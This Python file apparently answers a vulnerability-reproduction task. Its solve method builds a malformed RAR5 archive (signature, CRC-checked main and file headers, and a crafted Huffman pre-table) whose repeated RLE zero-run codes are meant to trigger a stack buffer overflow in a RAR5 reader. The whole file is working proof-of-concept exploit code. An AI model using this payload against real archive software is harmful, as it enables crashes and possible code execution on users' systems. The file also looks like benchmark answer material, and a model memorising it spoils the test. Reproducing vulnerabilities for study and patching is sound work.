import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow in RAR5 Huffman table parsing.
        """
        
        def to_varint(n):
            res = bytearray()
            while n > 0x7F:
                res.append((n & 0x7F) | 0x80)
                n >>= 7
            res.append(n)
            return bytes(res)

        def get_crc(data):
            return struct.pack('<I', zlib.crc32(data) & 0xFFFFFFFF)

        # RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # --- Main Header ---
        # Header Type: 1 (Main)
        # Header Flags: 0 (No extra area, no data area)
        mh_data = to_varint(1) + to_varint(0)
        mh_size = to_varint(len(mh_data))
        # CRC is calculated over HeaderSize + HeaderData
        main_header = get_crc(mh_size + mh_data) + mh_size + mh_data

        # --- File Header ---
        payload_len = 450 # Sufficient length to carry payload
        
        # Header Type: 2 (File)
        # Header Flags: 2 (0x0002 -> Data area is present)
        # Data Size: payload_len
        fh_base = to_varint(2) + to_varint(2) + to_varint(payload_len)
        
        # File Header Specific Fields
        # File Flags: 0
        # Unpacked Size: 0x100000 (arbitrary large)
        # Attributes: 0
        # Compression Info: 3 (Method 3 - Normal, non-solid, 128KB dict)
        # Host OS: 0
        # Name Length: 1
        # Name: 'a'
        fh_spec = (
            to_varint(0) + 
            to_varint(0x100000) + 
            to_varint(0) + 
            to_varint(3) + 
            to_varint(0) + 
            to_varint(1) + 
            b'a'
        )
        
        fh_data = fh_base + fh_spec
        fh_size = to_varint(len(fh_data))
        file_header = get_crc(fh_size + fh_data) + fh_size + fh_data

        # --- Payload ---
        # The vulnerability exists in the RAR5 reader when parsing Huffman tables.
        # Specifically, malformed RLE codes can cause a buffer overflow during table decoding.
        
        # Block Header: 0x80 (Huffman tables present)
        payload = bytearray(b'\x80')
        
        # Huffman Code Length Table (Pre-table)
        # RAR5 reads 20 4-bit nibbles for the pre-table lengths.
        # We construct a table where index 19 (associated with long zero runs) has length 1.
        # Nibbles: 0, 0, ..., 1 (Index 19)
        # 9 bytes of 0x00 (indices 0-17), 1 byte of 0x10 (index 18=0, index 19=1)
        payload.extend(b'\x00' * 9 + b'\x10')
        
        # Compressed Data Stream
        # Since index 19 has length 1 (and code '0' or '1'), we fill the stream with zeros.
        # Each bit triggers the symbol 19, which is an RLE code for zeros.
        # Repeated execution of this RLE code without bounds checking causes the overflow.
        payload.extend(b'\x00' * (payload_len - len(payload)))

        return sig + main_header + file_header + bytes(payload)